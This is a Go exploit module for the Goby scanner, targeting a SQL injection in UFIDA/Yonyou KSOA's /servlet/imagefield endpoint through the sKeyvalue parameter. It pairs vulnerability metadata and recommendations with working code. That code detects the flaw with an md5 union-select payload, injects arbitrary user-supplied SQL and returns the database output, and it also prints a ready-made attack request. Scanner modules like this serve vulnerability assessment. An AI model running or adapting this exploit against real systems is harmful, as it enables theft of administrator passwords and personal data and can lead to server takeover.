package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "UFIDA KSOA servlet/imagefield file sKeyvalue parameter SQL injection vulnerability",
    "Description": "<p>UFIDA KSOA is a new-generation product developed under the guidance of the SOA concept. It is a unified IT infrastructure launched according to the cutting-edge IT needs of distribution companies. Circulation enterprises can protect the original IT investment, simplify IT management, enhance competitiveness, and ensure the realization of the overall strategic goals and innovation activities of the enterprise.</p><p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator background passwords, site user personal information), attackers can even write Trojan horses into the server under high-privilege conditions to further obtain server system permissions.</p>",
    "Product": "yonyou-Time-and-Space-KSOA",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2023-02-06",
    "Author": "White_2021@163.com",
    "FofaQuery": "body=\"onmouseout=\\\"this.classname='btn btnOff'\\\"\"",
    "GobyQuery": "body=\"onmouseout=\\\"this.classname='btn btnOff'\\\"\"",
    "Level": "3",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "select+sys.fn_varbintohexstr(hashbytes('md5','test'))--+",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','test'))--+",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "098f6bcd4621d373cade4e832627b4f6",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+{{{sql}}}--+",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "10",
    "Translation": {
        "CN": {
            "Name": "用友时空 KSOA servlet/imagefield 文件 sKeyvalue 参数 SQL 注入漏洞",
            "Product": "用友-时空KSOA",
            "Description": "<p>用友时空 KSOA 是建立在 SOA 理念指导下研发的新一代产品，是根据流通企业前沿的IT需求推出的统一的 IT 基础架构，它可以让流通企业各个时期建立的IT系统之间彼此轻松对话，帮助流通企业保护原有的 IT 投资，简化 IT 管理，提升竞争能力，确保企业整体的战略目标以及创新活动的实现。</p><p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "UFIDA KSOA servlet/imagefield file sKeyvalue parameter SQL injection vulnerability",
            "Product": "yonyou-Time-and-Space-KSOA",
            "Description": "<p>UFIDA KSOA is a new-generation product developed under the guidance of the SOA concept. It is a unified IT infrastructure launched according to the cutting-edge IT needs of distribution companies. Circulation enterprises can protect the original IT investment, simplify IT management, enhance competitiveness, and ensure the realization of the overall strategic goals and innovation activities of the enterprise.</p><p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, administrator background passwords, site user personal information), attackers can even write Trojan horses into the server under high-privilege conditions to further obtain server system permissions.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-08-08",
    "PocId": "10818"
}`
	doReq123Uiwens := func(hostInfo *httpclient.FixUrl, url string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewGetRequestConfig(url)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		return resp, err
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			if resp, err := doReq123Uiwens(hostInfo, "/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','test'))--+"); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "098f6bcd4621d373cade4e832627b4f6") {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "sql" {
				sqlCmd := goutils.B2S(ss.Params["sql"])
				url := "/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+" + sqlCmd
				if resp, err := doReq123Uiwens(expResult.HostInfo, url); err == nil {
					if resp.StatusCode == 200 {
						expResult.Success = true
						expResult.Output = resp.RawBody
					}
				}
			} else if attackType == "sqlPoint" {
				expResult.Output = `Payload中的特殊字符和数字需要进行URL编码

GET /servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','test'))--+ HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close

`
        expResult.Success = true
			}
			return expResult
		},
	))
}
